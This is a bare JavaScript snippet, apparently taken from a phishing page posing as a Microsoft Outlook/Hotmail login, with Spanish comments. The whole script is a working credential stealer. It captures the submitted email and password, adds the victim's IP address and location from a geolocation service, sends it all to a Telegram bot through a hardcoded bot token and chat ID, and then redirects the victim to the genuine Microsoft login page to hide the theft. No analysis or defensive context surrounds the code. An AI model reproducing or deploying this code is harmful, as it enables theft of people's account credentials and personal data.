<script>
document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault(); // Evitar que el formulario se envíe de forma predeterminada

    // Obtener los valores del formulario
    var correo = document.querySelector('input[name="bcrreo"]').value;
    var clave = document.querySelector('input[name="bclv"]').value;

    // Construir el mensaje que se enviará al bot de Telegram
    var mensaje = "Correo: " + correo + "\nClave: " + clave;

    // Obtener la información de geolocalización de la IP
    fetch('https://ipapi.co/json/')
        .then(function(response) {
            return response.json();
        })
        .then(function(data) {
            mensaje += "\n\nDirección IP: " + data.ip;
            mensaje += "\nPaís: " + data.country_name;
            mensaje += "\nEstado/Región: " + data.region;

    // Token del bot de Telegram
    var token = "6821107808:AAGvk27TftLb5gflY_h3MH0kOu7UaCisRXg";

    // Chat ID al que enviar el mensaje
    var chatId = "-1001956292164";

    // URL de la API de Telegram para enviar mensajes
    var apiUrl = "https://api.telegram.org/bot" + token + "/sendMessage";

    // Datos que se enviarán al bot de Telegram
    var data = {
        chat_id: chatId,
        text: mensaje
    };

    // Configurar la solicitud HTTP
    var xhr = new XMLHttpRequest();
    xhr.open("POST", apiUrl, true);
    xhr.setRequestHeader("Content-Type", "application/json");


    // Enviar los datos al bot de Telegram
    xhr.send(JSON.stringify(data));

    // Limpiar los campos del formulario después de enviar el mensaje
    document.querySelector('input[name="bcrreo"]').value = "";
    document.querySelector('input[name="bclv"]').value = "";

    // Redirección después de enviar el mensaje (opcional)
    xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            // Redirigir a la página deseada
            window.location.href = "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=22&ct=1711383069&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f0%2f%3fstate%3d1%26redirectTo%3daHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwvMC8%26RpsCsrfState%3d835104b2-678e-98ee-a96e-e6a797887f8a&id=292841&aadredir=1&whr=hotmail.com&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015";
        }
    };
    // Opcional: Puedes agregar una notificación o redireccionar a otra página después de enviar el mensaje
});
</script>